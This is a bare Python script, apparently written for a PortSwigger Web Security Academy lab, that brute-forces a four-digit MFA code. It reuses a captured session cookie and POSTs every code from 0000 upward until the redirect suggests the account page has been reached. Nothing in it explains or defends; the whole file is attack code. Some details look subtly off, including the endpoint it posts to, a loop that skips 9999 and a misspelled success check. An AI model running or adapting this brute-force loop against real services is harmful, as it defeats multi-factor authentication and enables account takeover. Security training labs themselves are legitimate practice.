import requests

burp0_url = "https://0a6b00a604942234818f9dd90044001a.web-security-academy.net:443/academyLabHeader"
burp0_cookies = {"session": "nusTzELSH2DET6L0reB7qjMY9meuacqK"}
burp0_headers = {"Connection": "Upgrade", "Pragma": "no-cache", "Cache-Control": "no-cache", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36", "Upgrade": "websocket", "Origin": "https://0a6b00a604942234818f9dd90044001a.web-security-academy.net", "Sec-WebSocket-Version": "13", "Accept-Encoding": "gzip, deflate, br", "Accept-Language": "en-US,en;q=0.9", "Sec-WebSocket-Key": "eDMSbUfXlVXI5T/Pw+UZEg=="}
requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies)

for i in range(9999):
	pin = str(i).zfill(4)
	burp0_data = {"mfa-code": pin}
	response = requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)
	print(pin, response.url, end="\r")
	if "my-acount" in response.url:
		break